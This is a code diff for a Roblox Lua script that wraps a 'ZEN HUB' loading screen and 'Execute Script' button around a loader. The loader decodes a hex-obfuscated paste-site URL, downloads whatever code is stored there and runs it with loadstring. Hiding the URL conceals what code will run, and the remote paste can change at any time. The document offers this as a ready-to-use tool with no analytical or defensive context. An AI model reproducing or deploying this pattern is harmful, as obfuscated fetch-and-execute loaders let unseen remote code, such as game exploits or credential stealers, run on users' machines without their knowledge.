@@ -1,10 +1,55 @@
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create Loading Screen
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)  -- Full screen
+loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+loadingFrame.BackgroundTransparency = 0.5
+loadingFrame.Visible = false  -- Hidden initially
+loadingFrame.Parent = screenGui
+
+-- Create Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(0, 300, 0, 50)  -- Size of the text
+loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)  -- Centered
+loadingText.Text = "ZEN HUB\nLoading..."
+loadingText.TextSize = 30
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.GothamBold
+loadingText.Parent = loadingFrame
+
+-- Create Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0.5, -100)
+button.Text = "Execute Script"
+button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.Parent = screenGui
+
+-- Function to convert hex to string
 local function hex_to_str(hex)
     return hex:gsub('..', function(cc)
         return string.char(tonumber(cc, 16))
     end)
 end
 
+-- URL encoded in hex
 local encoded = "687474703a2f2f7670617374652e6e65742f424f733267"
 local url = hex_to_str(encoded)
 
-loadstring(game:HttpGet(url))()
+-- When button is clicked, show loading and run script
+button.MouseButton1Click:Connect(function()
+    loadingFrame.Visible = true  -- Show loading screen
+
+    -- Run the script after a small delay (simulating loading)
+    wait(2)  -- Adjust this delay to match your loading time if needed
+    loadstring(game:HttpGet(url))()  -- Execute the script from the URL
+    
+    -- Hide loading screen once the script has loaded
+    loadingFrame.Visible = false
+end)
